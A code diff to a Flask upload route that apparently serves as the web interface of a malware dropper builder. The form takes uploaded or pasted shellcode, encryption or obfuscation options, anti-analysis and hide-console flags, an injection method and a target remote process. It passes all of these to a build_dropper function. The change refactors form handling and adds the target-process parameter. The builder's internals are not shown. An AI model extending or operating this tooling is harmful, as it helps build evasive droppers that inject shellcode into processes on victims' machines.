@@ -47,17 +47,18 @@ def init_routes(app):
     
     @app.route('/upload', methods=['POST'])
     def upload_file():
+        # Initialize a dictionary to store form data
+        form_data = {}
+
+        # Add all form inputs to form_data
+        for key, value in request.form.items():
+            form_data[key] = value
+
         # Handle checkbox inputs
-        encryption_or_obfuscation = request.form.get('encryption', None) or request.form.get('obfuscation', None)
-        if encryption_or_obfuscation:
-            encryption_or_obfuscation = encryption_or_obfuscation.lower()
-        else:
-            encryption_or_obfuscation = ""
-        #encryption_or_obfuscation = encryption_or_obfuscation.split(' ')[0]
-        injection_method = request.form.get('injection', None)
-        anti_analysis = request.form.get('anti_analysis', None) is not None
-        debug_enabled = request.form.get('debug', None) is not None
-        hide_console = request.form.get('hide_console', None) is not None
+        form_data['encryption_or_obfuscation'] = (form_data.get('encryption') or form_data.get('obfuscation') or "").lower()
+        form_data['anti_analysis'] = form_data.get('anti_analysis') is not None
+        form_data['debug_enabled'] = form_data.get('debug') is not None
+        form_data['hide_console'] = form_data.get('hide_console') is not None
 
         # Handle file upload
         if 'shellcode' in request.files:
@@ -65,37 +66,38 @@ def init_routes(app):
             if file.filename != '':
                 with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                     temp_file.write(file.read())  # Write file content to temp file
-                    shellcode_path = temp_file.name
+                    form_data['shellcode_path'] = temp_file.name
             else:
-                shellcode_path = None
+                form_data['shellcode_path'] = None
         else:
-            shellcode_text = request.form.get('shellcode_text')
+            form_data['shellcode_text'] = form_data.get('shellcode_text')
 
         # Handle filename and file extension
-        out_filename = request.form.get('filename')
-        out_file_extension = request.form.get('file_extension')
+        form_data['out_filename'] = f"{form_data.get('filename')}{form_data.get('file_extension')}"
 
         # Process the inputs as needed
-        # For example, you can print them or save them to a database
-        print(f"Encryption/Obfuscation: {encryption_or_obfuscation}")
-        print(f"Anti Analysis: {anti_analysis}")
-        print(f"Injection Method: {injection_method}")
-        if shellcode_path:
-            print(f"Shellcode Path: {shellcode_path}")
+        print(f"Encryption/Obfuscation: {form_data['encryption_or_obfuscation']}")
+        print(f"Anti Analysis: {form_data['anti_analysis']}")
+        print(f"Injection Method: {form_data.get('injection')}")
+        print(f"Target Remote Process: {form_data.get('process_name', "None")}.exe")
+        if form_data.get('shellcode_path'):
+            print(f"Shellcode Path: {form_data['shellcode_path']}")
         else:
-            print(f"Shellcode Text: {shellcode_text}")
-        print(f"Output Filename: {out_filename}{out_file_extension}")
-        print(f"Debug Enabled: {debug_enabled}")
-        
+            print(f"Shellcode Text: {form_data.get('shellcode_text')}")
+        print(f"Output Filename: {form_data['out_filename']}")
+        print(f"Debug Enabled: {form_data['debug_enabled']}")
+
+        # Call build_dropper with the form data
         build_dropper(
-            debug_enabled=debug_enabled,
-            out_filename=f"{out_filename}{out_file_extension}",
-            shellcode_path=shellcode_path,
-            out_file_extension=out_file_extension,
-            encryption_or_obfuscation=encryption_or_obfuscation,
-            anti_analysis=anti_analysis,
-            injection_method=injection_method,
-            hide_console=hide_console
+            debug_enabled=form_data['debug_enabled'],
+            out_filename=form_data['out_filename'],
+            shellcode_path=form_data.get('shellcode_path'),
+            out_file_extension=form_data['file_extension'],
+            encryption_or_obfuscation=form_data['encryption_or_obfuscation'],
+            anti_analysis=form_data['anti_analysis'],
+            injection_method=form_data.get('injection'),
+            process_name=f"{form_data.get("process_name", "")}.exe" if form_data.get("process_name") else None,
+            hide_console=form_data['hide_console'],
         )
 
         return redirect(url_for('index'))
